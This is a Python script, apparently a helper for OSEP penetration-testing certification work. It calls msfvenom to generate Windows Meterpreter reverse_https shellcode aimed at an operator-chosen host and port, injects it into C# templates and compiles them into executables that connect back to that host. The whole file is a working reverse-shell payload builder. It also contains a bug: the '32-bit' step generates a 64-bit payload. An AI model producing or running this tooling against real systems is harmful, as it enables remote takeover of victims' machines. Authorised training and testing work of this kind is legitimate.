#/usr/bin/python3

import argparse
import os
import glob

def cheers():
    print()
    print("[+] We're all done here")
    print("[+] Now go and get this certification :)")

def exe_will_rain():
    print("[+] Starting to compile CS files..")

    try:
        for filename in glob.glob("cs-output/*.cs"):
            command = "mcs %s"%(filename)
            print("[+] Compiling: ",command)
            os.system(command)
            print()

    except Exception as e:
        print(str(e))
        quit()

       

def template_filling(mark, buf_32, buf_64: str):
    print("[+] The mark where shellcode will be inserted is: '%s'"%(mark))
    print("[+] Starting to fill up templates..")

    try:
        for filename in os.listdir("cs-templates"):
            with open(os.path.join("cs-templates", filename), 'r') as f:
                text = f.read()
                result = text.replace(mark, buf_32, 1)
                #print(result)
                with open(os.path.join("cs-output", "32"+filename), 'w') as r:
                    r.write(result)

    except Exception as e:
        print(str(e))
        quit()


    try:
            for filename in os.listdir("cs-templates"):
                with open(os.path.join("cs-templates", filename), 'r') as f:
                    text = f.read()
                    result = text.replace(mark, buf_64, 1)
                    #print(result)
                    with open(os.path.join("cs-output", "64"+filename), 'w') as r:
                        r.write(result)

    except Exception as e:
        print(str(e))
        quit()

    print("[+] Done!")

def msf_gen(l:str, p:int):
    print("[+] Generating x86 and x64 MSF HTTPS staged payloads, for %s:%d"%(l,p))

    msf_1 = "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=%s EXITFUNC=thread LPORT=%d -f csharp -o met64.cs"%(l,p)
    print("[+] Executing: ", msf_1)
    print()
    os.system(msf_1)
    print()
    
    msf_2 = "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=%s EXITFUNC=thread LPORT=%d -f csharp -o met32.cs"%(l,p)
    print("[+] Executing: ", msf_2)
    print()
    os.system(msf_2)
    print()

    with open("met32.cs", "r") as file:
        content_32 = file.read()

    with open("met64.cs", "r") as file:
        content_64 = file.read()
    
    #print("Content of 32 MSF:")
    #print("", content_32)

    #print("Content of 64 MSF:")
    #print("", content_64)

    return content_32, content_64


def cli_parser():
    parser = argparse.ArgumentParser(description='OSEP payload generator for lazy pentesters. msfvenom needs to be installed and in path.')
    parser.add_argument('-l', help='-l LHOST', type=str)
    parser.add_argument('-p', help='-p LPORT', type=int)
    args = parser.parse_args()
    
    if (args.l == None or args.p == None):
        parser.print_help()
        quit()

    return args.l, args.p


if __name__=="__main__":
    #Get IP and port from command line arguments
    l:str
    p:int
    l, p = cli_parser()

    #Generating corresponding meterpreter payloads
    content_32:str
    content_64:str
    content32, content_64 = msf_gen(l, p)

    #Open all files in "templates" folder, and swap the content for the payloads
    mark:str = "!!! FIND ME PYTHON, PLZ !!!"
    template_filling(mark, content32, content_64)

    #Compiling all CS files for you bro
    exe_will_rain()

    #Only cheers up the amazing pentesters
    cheers()